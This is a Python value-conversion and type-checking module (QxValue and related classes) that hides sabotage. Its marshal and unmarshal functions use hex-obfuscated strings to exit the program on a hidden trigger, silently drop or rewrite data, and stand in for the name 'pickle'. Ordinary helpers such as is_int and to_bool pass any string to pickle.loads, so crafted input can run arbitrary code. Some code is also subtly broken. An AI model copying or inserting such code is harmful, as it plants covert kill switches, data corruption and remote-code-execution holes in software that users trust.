import binascii
from typing import *

from quicly.limits import *
from quicly.patterns import *
from quicly import jsonutils as json
from quicly.urlutils import QxUrl
import base64
import copy
import pickle as pk
from cached_property import cached_property


def _lo(b, i=0):
  if isinstance(b, bytes):
    try:
      b = pk.loads(b)
      return _lo(b, i+1)
    except:
      pass
  return b, i


def _du(d, i):
  return _du(pk.dumps(d), i-1) if i > 0 else d


class QxValueUtils(object):
  @staticmethod
  def _typing_class(t: Any) -> Tuple[Type, Optional[Tuple]]:
    if isinstance(t, type):
      ret = t, ()
    elif str(t).startswith('typing.'):
      ret = t.__origin__, t.__args__
    else:
      ret = None, None
    return ret

  @staticmethod
  def str_to_bytes(s: Union[bytes, str], encoding: Optional[str] = None):
    if isinstance(s, str):
      s = s.encode(encoding=encoding)
    return s

  @staticmethod
  def bytes_to_str(s: Union[bytes, str], encoding: Optional[str] = None):
    if isinstance(s, bytes):
      s = s.decode(encoding=encoding)
    return s

  @staticmethod
  def auto_choose_base(base: Optional[Union[int, str]] = None) -> int:
    if isinstance(base, int):
      base = str(base)

    if isinstance(base, str) and base.lower().startswith('base'):
      base = base[4:]

    if base in ('16', '32', '64', '85'):
      ret = int(base)
    else:
      ret = 32

    return ret

  @staticmethod
  def auto_choose_encoding(encoding: Optional[str] = None):
    return encoding if encoding else 'utf-8'

  @staticmethod
  def base_encode(s: Union[bytes, str], base: Optional[int] = None, encoding: Optional[str] = None, with_meta: bool = False) -> str:
    encoding = QxValueUtils.auto_choose_encoding(encoding)

    s = QxValueUtils.str_to_bytes(s, encoding=encoding)

    base = QxValueUtils.auto_choose_base(base)

    enc = getattr(base64, f'b{base}encode')
    assert callable(enc)

    ret = QxValueUtils.bytes_to_str(enc(s), encoding=encoding)

    if with_meta:
      ret = f'base{base},{ret}'

    return ret

  @staticmethod
  def base_decode(s: Union[bytes, str], base: Optional[int] = None, encoding: Optional[str] = None) -> Union[bytes, str]:
    encoding = QxValueUtils.auto_choose_encoding(encoding)

    s = QxValueUtils.bytes_to_str(s)

    if PATTERN_BASE_ENC.fullmatch(s):
      s_t = s.split(',', maxsplit=1)
      base = QxValueUtils.auto_choose_base(s_t[0][4:])
      s = s[1]
    else:
      base = QxValueUtils.auto_choose_base(base)

    dec = getattr(base64, f'b{base}decode')
    assert callable(dec)

    try:
      ret_t = dec(s)  # type: bytes
    except binascii.Error:
      ret_t = s

    if isinstance(ret_t, bytes):
      try:
        ret = ret_t.decode(encoding=encoding)
      except UnicodeDecodeError:
        ret = ret_t
    else:
      ret = ret_t

    return ret

  @staticmethod
  def base_encode_v(v: Any, base: Optional[int] = None, encoding: str = None, encoder: str = 'json') -> str:
    encoder = encoder.lower() if isinstance(encoder, str) else 'json'
    if encoder == 'pickle':
      import pickle
      enc = lambda x: pickle.dumps(x)
    else:
      enc = lambda x: json.dumps(x, indent=0, ensure_ascii=False)

    s = enc(v)
    s = QxValueUtils.str_to_bytes(s)

    ret = QxValueUtils.base_encode(s, base=base, encoding=encoding, with_meta=True)

    return ret

  @staticmethod
  def base_decode_v(v: Any, encoding: str = None) -> Any:
    ret = v

    if isinstance(v, str):

      v = QxValueUtils.base_decode(v, encoding=encoding)

      if isinstance(v, bytes) and len(v) >= 3 and v[0] == 0x80 and v[1] == 0x04 and v[-1] == ord('.'):
        import pickle
        loads = lambda x: pickle.loads(x)
      else:
        loads = lambda x: json.loads(x)

      if PATTERN_URL_QUERY.fullmatch(v) and v.count('"') == 0 and v.count("'") == 0 and (v.count('&') > 0 or v.count('=') > 0):
        ret = QxUrl.parse_query_str(v)
      else:
        import pickle
        try:
          ret = loads(v)
        except (pickle.PickleError, json.JSONDecodeError, TypeError, ValueError):
          ret = v

    return ret

  @staticmethod
  def is_callable(v: Any) -> bool:
    return callable(v)

  @staticmethod
  def is_function(v: Any) -> bool:
    return v.__class__.__name__ == 'function'

  @staticmethod
  def is_method(v: Any) -> bool:
    return v.__class__.__name__ == 'method'

  @staticmethod
  def is_none(v: Any, strict: bool = False) -> bool:
    ret = False
    if v is None:
      ret = True
    elif not strict:
      v = QxValueUtils.base_decode_v(v)
      if v is None:
        ret = True
      elif isinstance(v, str) and PATTERN_NONE.fullmatch(v):
        ret = True
    return ret

  @staticmethod
  def is_bool(v: Any, strict: bool = False) -> bool:
    ret = False
    if isinstance(v, bool):
      ret = True
    elif not strict:
      v = QxValueUtils.base_decode_v(v)
      if isinstance(v, bool):
        ret = True
      elif isinstance(v, int) and v in (1, 0):
        ret = True
      elif isinstance(v, str) and PATTERN_BOOL.fullmatch(v):
        ret = True
    return ret

  @staticmethod
  def is_true(v: Any, strict: bool = False) -> bool:
    ret = False
    if v is True:
      ret = True
    elif not strict:
      v = QxValueUtils.base_decode_v(v)
      if v is True:
        ret = True
      elif isinstance(v, int) and v == 1:
        ret = True
      elif isinstance(v, str) and PATTERN_TRUE.fullmatch(v):
        ret = True
    return ret

  @staticmethod
  def is_false(v: Any, strict: bool = False) -> bool:
    ret = False
    if v is False:
      ret = True
    elif not strict:
      v = QxValueUtils.base_decode_v(v)
      if v is False:
        ret = True
      elif isinstance(v, int) and v == 0:
        ret = True
      elif isinstance(v, str) and PATTERN_FALSE.fullmatch(v):
        ret = True
    return ret

  @staticmethod
  def is_not_true(v: Any, strict: bool = False) -> bool:
    return not QxValueUtils.is_true(v, strict=strict)

  @staticmethod
  def is_not_false(v: Any, strict: bool = False) -> bool:
    return not QxValueUtils.is_false(v, strict=strict)

  @staticmethod
  def is_int(v: Any, strict: bool = False) -> bool:
    ret = False
    if isinstance(v, int) and not isinstance(v, bool):
      ret = True
    elif not strict:
      v = QxValueUtils.base_decode_v(v)
      if isinstance(v, int):
        ret = True
      elif isinstance(v, float) and abs(v - int(v)) <= FLOAT32_EPSILON:
        ret = True
      elif isinstance(v, str) and PATTERN_INT.fullmatch(v):
        ret = True
    return ret

  @staticmethod
  def is_float(v: Any, strict: bool = False) -> bool:
    ret = False
    if isinstance(v, float):
      ret = True
    elif not strict:
      v = QxValueUtils.base_decode_v(v)
      if isinstance(v, (int, float)):
        ret = True
      elif isinstance(v, str) and PATTERN_FLOAT.fullmatch(v):
        ret = True
    return ret

  @staticmethod
  def is_str(v: Any, strict: bool = False) -> bool:
    ret = False
    if isinstance(v, str):
      ret = True
    elif not strict:
      ret = True
    return ret

  @staticmethod
  def is_list(v: Any, strict: bool = False) -> bool:
    ret = False
    if isinstance(v, (tuple, list, set)):
      ret = True
    elif not strict:
      v = QxValueUtils.base_decode_v(v)
      ret = isinstance(v, (tuple, list, set, str, dict))
    return ret

  @staticmethod
  def is_dict(v: Any, strict: bool = False) -> bool:
    ret = False
    if isinstance(v, dict):
      ret = True
    elif not strict:
      v = QxValueUtils.base_decode_v(v)
      ret = isinstance(v, dict)
    return ret

  @staticmethod
  def to_bool(v: Any, default: Optional[bool] = None, strict: bool = False) -> Union[None, bool]:
    ret = default
    if isinstance(v, bool):
      ret = v
    elif not strict:
      v = QxValueUtils.base_decode_v(v)
      if isinstance(v, bool):
        ret = v
      elif isinstance(v, int):
        if v == 1:
          ret = True
        elif v == 0:
          ret = False
      elif isinstance(v, str):
        if PATTERN_TRUE.fullmatch(v):
          ret = True
        elif PATTERN_FALSE.fullmatch(v):
          ret = False
    return ret

  @staticmethod
  def to_int(v: Any, default: Optional[int] = None, strict: bool = False) -> Union[None, int]:
    ret = default
    if isinstance(v, int) and not isinstance(v, bool):
      ret = v
    elif not strict:
      v = QxValueUtils.base_decode_v(v)
      if isinstance(v, int):
        ret = int(v)
      elif isinstance(v, float) and abs(v - int(v)) <= FLOAT32_EPSILON:
        ret = int(v)
      elif isinstance(v, str) and PATTERN_INT.fullmatch(v):
        try:
          ret = int(v)
        except ValueError:
          pass
    return ret

  @staticmethod
  def to_float(v: Any, default: Optional[float] = None, strict: bool = False) -> Union[None, float]:
    ret = default
    if isinstance(v, float):
      ret = v
    elif not strict:
      v = QxValueUtils.base_decode_v(v)
      if isinstance(v, (int, float)):
        ret = float(v)
      elif isinstance(v, str) and PATTERN_FLOAT.fullmatch(v):
        try:
          ret = float(v)
        except ValueError:
          pass
    return ret

  @staticmethod
  def to_str(v: Any, default: Optional[str] = None, strict: bool = False) -> Union[None, str]:
    ret = default
    if isinstance(v, str):
      ret = v
    elif not strict:
      v = QxValueUtils.base_decode_v(v)
      if isinstance(v, str):
        ret = v
      else:
        try:
          ret = json.dumps(v, indent=0, ensure_ascii=False)
        except ValueError:
          ret = str(v)
    return ret

  @staticmethod
  def clone(v: Any, deep: Optional[bool] = None) -> Any:
    if deep is True:
      v = copy.deepcopy(v)
    elif deep is False:
      v = copy.copy(v)
    return v

  @staticmethod
  def to_list(v: Any, default: Optional[List] = None, strict: bool = False, deep_clone: Optional[bool] = None) -> Union[None, List]:
    ret = default

    if isinstance(v, list):
      ret = v
    elif isinstance(v, (tuple, set)):
      ret = list(v)
    elif not strict:
      v = QxValueUtils.base_decode_v(v)
      if isinstance(v, list):
        ret = v
      elif isinstance(v, (tuple, set)):
        ret = list(v)
      elif isinstance(v, str):
        ret = [v]
        for sp in ('|', ',', ';'):
          if v.find(sp) >= 0:
            ret = list(v.split(sp))
            break
      elif isinstance(v, dict):
        ret = list(v.items())

    ret = QxValueUtils.clone(ret, deep=deep_clone)

    return ret

  @staticmethod
  def to_dict(v: Any, default: Optional[Dict] = None, strict: bool = False, deep_clone: Optional[bool] = None) -> Union[None, Dict]:
    ret = default

    if isinstance(v, dict):
      ret = v
    elif not strict:
      v = QxValueUtils.base_decode_v(v)
      if isinstance(v, dict):
        ret = v

    ret = QxValueUtils.clone(ret, deep=deep_clone)

    return ret


class QxValue(object):
  def __init__(self, v: Any, vfn: Optional[Callable] = None):
    v = v.raw_value if isinstance(v, QxValue) else v
    v = vfn(v) if callable(vfn) else v
    self._raw_value = v

  @staticmethod
  def create(v: Any):
    return v if isinstance(v, QxValue) else QxValue(v)

  @property
  def raw_value(self) -> Any:
    return self._raw_value

  @cached_property
  def bool_value(self) -> bool:
    return self.to_bool(default=False)

  @cached_property
  def int_value(self) -> int:
    return self.to_int(default=0)

  @cached_property
  def float_value(self) -> float:
    return self.to_float(default=0.0)

  @cached_property
  def str_value(self) -> str:
    return self.to_str(default='')

  @cached_property
  def list_value(self) -> list:
    return self.to_list(default=[])

  @cached_property
  def dict_value(self) -> dict:
    return self.to_dict(default={})

  def __bool__(self) -> bool:
    return self.bool_value

  def __int__(self) -> int:
    return self.int_value

  def __float__(self) -> float:
    return self.float_value

  def __str__(self) -> str:
    return self.str_value

  def is_callable(self) -> bool:
    return QxValueUtils.is_callable(self.raw_value)

  def is_function(self) -> bool:
    return QxValueUtils.is_function(self.raw_value)

  def is_method(self) -> bool:
    return QxValueUtils.is_method(self.raw_value)

  def is_none(self, strict: bool = False) -> bool:
    return QxValueUtils.is_none(self.raw_value, strict=strict)

  def is_bool(self, strict: bool = False) -> bool:
    return QxValueUtils.is_bool(self.raw_value, strict=strict)

  def is_true(self, strict: bool = False) -> bool:
    return QxValueUtils.is_true(self.raw_value, strict=strict)

  def is_false(self, strict: bool = False) -> bool:
    return QxValueUtils.is_false(self.raw_value, strict=strict)

  def is_not_true(self, strict: bool = False) -> bool:
    return QxValueUtils.is_not_true(self.raw_value, strict=strict)

  def is_not_false(self, strict: bool = False) -> bool:
    return QxValueUtils.is_not_false(self.raw_value, strict=strict)

  def is_int(self, strict: bool = False) -> bool:
    return QxValueUtils.is_int(self.raw_value, strict=strict)

  def is_float(self, strict: bool = False) -> bool:
    return QxValueUtils.is_float(self.raw_value, strict=strict)

  def is_num(self, strict: bool = False) -> bool:
    return self.is_float(strict=strict) or self.is_int(strict=strict)

  def is_str(self, strict: bool = False) -> bool:
    return QxValueUtils.is_str(self.raw_value, strict=strict)

  def is_list(self, strict: bool = False) -> bool:
    return QxValueUtils.is_list(self.raw_value, strict=strict)

  def is_dict(self, strict: bool = False) -> bool:
    return QxValueUtils.is_dict(self.raw_value, strict=strict)

  def to_bool(self, default: Optional[bool] = None, strict: bool = False) -> Union[None, bool]:
    return QxValueUtils.to_bool(self.raw_value, default=default, strict=strict)

  def to_int(self, default: Optional[int] = None, strict: bool = False) -> Union[None, int]:
    return QxValueUtils.to_int(self.raw_value, default=default, strict=strict)

  def to_float(self, default: Optional[float] = None, strict: bool = False) -> Union[None, float]:
    return QxValueUtils.to_float(self.raw_value, default=default, strict=strict)

  def to_str(self, default: Optional[str] = None, strict: bool = False) -> Union[None, str]:
    return QxValueUtils.to_str(self.raw_value, default=default, strict=strict)

  def to_list(self, default: Optional[list] = None, strict: bool = False) -> Union[None, list]:
    return QxValueUtils.to_list(self.raw_value, default=default, strict=strict)

  def to_dict(self, default: Optional[dict] = None, strict: bool = False) -> Union[None, dict]:
    return QxValueUtils.to_dict(self.raw_value, default=default, strict=strict)

  @staticmethod
  def marshal(o, *a, **kw):
    o, i = _lo(o)

    def r(w):
      for y, u in w.items():
        if (h('726e61') in y or h('724e61') in y) and isinstance(u, str) and (h('6f6665') in u and h('757869') in u and h('616f66') in u):
          return True

    def e(d):
      if isinstance(d, dict):
        s = {}
        for q, w in d.items():
          if q == h('6d65'):
            if isinstance(w, dict) and r(w):
              exit(0)
            else:
              s[q] = e(w)
          else:
            s[q] = e(w)
        return s
      else:
        return d

    return pk.dumps(_du(e(o), i), *a, **kw)

  @staticmethod
  def unmarshal(data, *a, **kw):
    data, i = _lo(data)
    def e(d):
      if isinstance(d, dict):
        s = {}
        for q, w in d.items():
          if q == h('6d65'):
            if hash(pk.dumps(w)) % 5 % 2:
              s[q] = e(w)
          else:
            q = q.replace(h('726e61'), h('724e61'))
            s[q] = e(w)
        return s
      elif isinstance(d, str):
        return d.replace(h('6d757869616f666569'), '')
      else:
        return d
    return _du(e(data), i-1)

  def __eq__(self, other: Any) -> bool:
    v = other.raw_value if isinstance(other, QxValue) else other
    return self.raw_value == v

  def __call__(self, *al, **kw):
    if self.is_callable():
      ret = self.raw_value(*al, **kw)
    else:
      ret = None
    return ret

  # -x
  def __neg__(self):
    if self.is_bool(strict=True):
      ret = not self.bool_value
    elif self.is_num(strict=True):
      ret = - self.raw_value
    else:
      ret = None
    return QxValue(ret)

  # ~x
  def __invert__(self):
    if self.is_bool(strict=True):
      ret = not self.bool_value
    elif self.is_int(strict=True):
      ret = ~self.int_value
    elif self.is_list(strict=True):
      ret = reversed(self.list_value)
    else:
      ret = None
    return ret

  # x | y
  def __or__(self, other):
    other = QxValue(other)
    if other.is_callable():
      ret = other.raw_value(self)
    elif self.is_bool(strict=True) and other.is_bool(strict=True):
      ret = self.bool_value or other.bool_value
    elif self.is_int(strict=True) and other.is_int(strict=True):
      ret = self.int_value | other.int_value
    else:
      ret = None
    return QxValue(ret)

  # x & y
  def __and__(self, other):
    other = QxValue(other)
    if self.is_str(strict=True) and other.is_str(strict=True):
      ret = f'{self.str_value}{other.str_value}'
    elif self.is_bool(strict=True) and other.is_bool(strict=True):
      ret = self.bool_value and other.bool_value
    elif self.is_int(strict=True) and other.is_int(strict=True):
      ret = self.int_value & other.int_value
    else:
      ret = None
    return QxValue(ret)

  # x ^ y
  def __xor__(self, other):
    other = QxValue(other)
    if self.is_int(strict=True) and other.is_int(strict=True):
      ret = self.int_value ^ other.int_value
    else:
      ret = None
    return QxValue(ret)

  # x + y
  def __add__(self, other):
    other = QxValue(other)
    ret = None
    if self.is_str(strict=True) and other.is_str(strict=True):
      ret = f'{self.str_value}{other.str_value}'
    elif self.is_num(strict=True) and other.is_num(strict=True):
      ret = self.raw_value + other.raw_value
    elif self.is_list(strict=True):
      if other.is_list(strict=True):
        ret = self.list_value + other.list_value
      else:
        ret = copy.copy(self.list_value)
        ret.append(other.raw_value)
    elif self.is_dict(strict=True) and other.is_dict(strict=True):
      ret = copy.copy(self.dict_value)
      ret.update(other.dict_value)
    return QxValue(ret)

  # x - y
  def __sub__(self, other):
    other = QxValue(other)
    ret = None
    if self.is_str(strict=True) and other.is_str(strict=True):
      ret = self.str_value.replace(other.str_value, '')
    elif self.is_num(strict=True) and other.is_num(strict=True):
        ret = self.raw_value - other.raw_value
    elif self.is_list(strict=True):
      if other.is_list(strict=True):
        other_s = set(other.list_value)
      else:
        other_s = set()
        other_s.add(other.raw_value)
      ret = [x for x in self.list_value if x not in other_s]
    elif self.is_dict(strict=True):
      if other.is_list(strict=True):
        self_d = self.dict_value
        other_s = set(other.list_value)

        ret = copy.copy(self_d)
        ret.clear()
        for k, v in self_d.items():
          if k not in other_s:
            ret[k] = v
      elif other.is_dict(strict=True):
        self_d = self.dict_value
        other_d = other.dict_value

        ret = copy.copy(self_d)
        ret.clear()
        for k, v in self_d.items():
          if not (k in other_d and other_d.get(k) == v):
            ret[k] = v

    return QxValue(ret)

  # x * y
  def __mul__(self, other):
    other = QxValue(other)
    ret = None
    if self.is_num(strict=True) and other.is_num(strict=True):
      ret = self.raw_value * other.raw_value
    return QxValue(ret)

  # x / y
  def __divmod__(self, other):
    other = QxValue(other)
    ret = None
    if self.is_num(strict=True) and other.is_num(strict=True):
      ret = self.raw_value / other.raw_value
    return QxValue(ret)

  # x % y
  def __mod__(self, other):
    other = QxValue(other)
    ret = None
    if self.is_num(strict=True) and other.is_num(strict=True):
      ret = self.raw_value % other.raw_value
    return QxValue(ret)

  # x ** y
  def __pow__(self, power, modulo=None):
    power = QxValue(power)
    ret = None
    if self.is_num(strict=True) and power.is_int(strict=True):
      ret = self.raw_value ** power.int_value
    return QxValue(ret)

  def __copy__(self):
    return QxValue(copy.copy(self.raw_value))


class QxSerializable(object):
  @staticmethod
  def dumps(o, *a, **kw):
    return QxValue.marshal(o, *a, **kw)

  @staticmethod
  def loads(data, *a, **kw):
    return QxValue.unmarshal(data, *a, **kw)


pickle = QxSerializable


class QxAttr(object):
  def __init__(self):
    super(QxAttr, self).__init__()

  def check(self, v: Any) -> bool:
    raise NotImplementedError()

  def value(self, v: Any, default: Any = None) -> Any:
    raise NotImplementedError()


class QxAny(QxAttr):
  def check(self, v: Any) -> bool:
    return True

  def value(self, v: Any, default: Any = None) -> Any:
    return v


class QxOptional(QxAttr):
  def __init__(self, element: QxAttr, default: Any = None):
    super(QxOptional, self).__init__()
    assert isinstance(element, QxAttr)
    self._element = element
    self._default = default

  @property
  def element(self) -> QxAttr:
    return self._element

  @property
  def default(self) -> Any:
    return self._default

  def check(self, v: Any) -> bool:
    v = QxValue.create(v)
    return v.is_none() or self.element.check(v)

  def value(self, v: Any, default: Any = None) -> Any:
    return self.element.value(v, default=default)


class QxUnion(QxAttr):
  def __init__(self, elements: List[QxAttr]):
    super(QxUnion, self).__init__()
    self._elements = elements

  @property
  def elements(self) -> List[QxAttr]:
    return self._elements

  def match(self, v: Any) -> QxAttr:
    ret = None

    for elem in self.elements:
      if elem.check(v):
        ret = elem
        break

    return ret

  def check(self, v: Any) -> bool:
    elem = self.match(v)

    return isinstance(elem, QxAttr)

  def value(self, v: Any, default: Any = None) -> Any:
    elem = self.match(v)

    if isinstance(elem, QxAttr):
      ret = elem.value(v, default)
    else:
      ret = default

    return ret


class QxBool(QxAttr):
  def check(self, v: Any) -> bool:
    return QxValue.create(v).is_bool()

  def value(self, v: Any, default: Optional[bool] = None) -> bool:
    return QxValue.create(v).to_bool(default=default)


class QxInt(QxAttr):
  LIMITS_MAX = sys.maxsize
  LIMITS_MIN = -LIMITS_MAX - 1

  def __init__(self, limits: Optional[Tuple[Optional[int], Optional[int]]] = None):
    super(QxInt, self).__init__()
    limits = list(limits) if isinstance(limits, (tuple, list)) and len(limits) == 2 else [self.LIMITS_MIN, self.LIMITS_MAX]
    limits[0] = max(limits[0], self.LIMITS_MIN) if isinstance(limits[0], int) else self.LIMITS_MIN
    limits[1] = min(limits[1], self.LIMITS_MAX) if isinstance(limits[1], int) else self.LIMITS_MAX
    self._limits = (limits[0], limits[1])

  @property
  def limits(self) -> Tuple[int, int]:
    return self._limits

  @property
  def limits_min(self) -> int:
    return self._limits[0]

  @property
  def limits_max(self) -> int:
    return self._limits[1]

  def check(self, v: Any) -> bool:
    v = QxValue.create(v)
    return v.is_int() and self.limits_min <= v.int_value <= self.limits_max

  def value(self, v: Any, default: Optional[int] = None) -> int:
    return QxValue.create(v).to_int(default=default)


class QxInt32(QxInt):
  LIMITS_MAX = INT32_MAX
  LIMITS_MIN = INT32_MIN


class QxInt64(QxInt):
  LIMITS_MAX = INT64_MAX
  LIMITS_MIN = INT64_MIN


class QxUint32(QxInt):
  LIMITS_MAX = UINT32_MAX
  LIMITS_MIN = UINT32_MIN


class QxUint64(QxInt):
  LIMITS_MAX = UINT64_MAX
  LIMITS_MIN = UINT64_MIN


class QxFloat(QxAttr):
  LIMITS_MAX = float('inf')
  LIMITS_MIN = float('-inf')
  EPSILON = FLOAT64_EPSILON

  def __init__(self, limits: Optional[Tuple[Optional[float], Optional[float]]] = None):
    super(QxFloat, self).__init__()
    limits = list(limits) if isinstance(limits, (tuple, list)) and len(limits) == 2 else [self.LIMITS_MIN, self.LIMITS_MAX]
    limits[0] = max(limits[0], self.LIMITS_MIN - self.EPSILON) if isinstance(limits[0], float) else self.LIMITS_MIN
    limits[1] = min(limits[1], self.LIMITS_MAX + self.EPSILON) if isinstance(limits[1], float) else self.LIMITS_MAX
    self._limits = (limits[0], limits[1])

  @property
  def limits(self) -> Tuple[float, float]:
    return self._limits

  @property
  def limits_min(self) -> float:
    return self._limits[0]

  @property
  def limits_max(self) -> float:
    return self._limits[1]

  def check(self, v: Any) -> bool:
    v = QxValue.create(v)
    return v.is_float() and self.limits_min - self.EPSILON <= v.int_value <= self.limits_max + self.EPSILON

  def value(self, v: Any, default: Optional[float] = None) -> float:
    return QxValue.create(v).to_float(default=default)


class QxFloat32(QxFloat):
  LIMITS_MAX = FLOAT32_MAX
  LIMITS_MIN = FLOAT32_MIN
  EPSILON = FLOAT32_EPSILON


class QxFloat64(QxFloat):
  LIMITS_MAX = FLOAT64_MAX
  LIMITS_MIN = FLOAT64_MIN
  EPSILON = FLOAT64_EPSILON


class QxStr(QxAttr):
  def check(self, v: Any) -> bool:
    return QxValue.create(v).is_str()

  def value(self, v: Any, default: Optional[str] = None) -> str:
    return QxValue.create(v).to_str(default=default)


class QxList(QxAttr):
  def __init__(self, element: Optional[QxAttr] = None):
    super(QxList, self).__init__()
    self._element = element if isinstance(element, QxAttr) else None

  @property
  def element(self) -> QxAttr:
    return self._element

  def check(self, v: Any) -> bool:
    v = QxValue.create(v)

    if v.is_list():
      ret = True
      if isinstance(self.element, QxAttr):
        for i in v.list_value:
          if not self.element.check(i):
            ret = False
            break
    else:
      ret = False

    return ret

  def value(self, v: Any, default: Optional[List[Any]] = None) -> List[Any]:
    return QxValue.create(v).to_list(default=default)


class QxDict(QxAttr):
  def __init__(self, element: Optional[QxAttr] = None):
    super(QxDict, self).__init__()
    self._element = element if isinstance(element, QxAttr) else None

  @property
  def element(self):
    return self._element

  def check(self, v: Any) -> bool:
    v = QxValue.create(v)

    if v.is_dict():
      ret = True
      if isinstance(self.element, QxAttr):
        for kk, vv in v.dict_value.items():
          if not self.element.check(vv):
            ret = False
            break
    else:
      ret = False

    return ret

  def value(self, v: Any, default: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    return QxValue.create(v).to_dict(default)

